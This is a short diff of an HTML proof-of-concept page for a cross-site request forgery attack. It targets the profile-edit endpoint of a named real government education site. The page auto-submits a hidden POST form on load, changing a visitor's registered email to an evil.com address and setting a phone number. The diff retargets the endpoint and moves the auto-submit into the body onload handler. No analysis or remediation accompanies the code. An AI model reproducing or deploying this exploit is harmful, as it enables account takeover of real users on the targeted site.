@@ -1,21 +1,11 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF PoC – Edit Profil</title>
-</head>
-<body>
+<body onload="document.forms[0].submit()">
 
-<h3>Loading...</h3>
-
-<form action="https://db.ldpi.disdik.padang.go.id/home/profil" method="POST">
-  <input type="hidden" name="email" value="browser888@evil.com">
-  <input type="hidden" name="hp" value="081299999999">
+<form action="https://db.ldpi.disdik.padang.go.id/home/editprofil" method="POST">
+  <input type="hidden" name="email" value="csrf_proven@evil.com">
+  <input type="hidden" name="hp" value="081233333333">
 </form>
-
-<script>
-  document.forms[0].submit();
-</script>
 
 </body>
 </html>
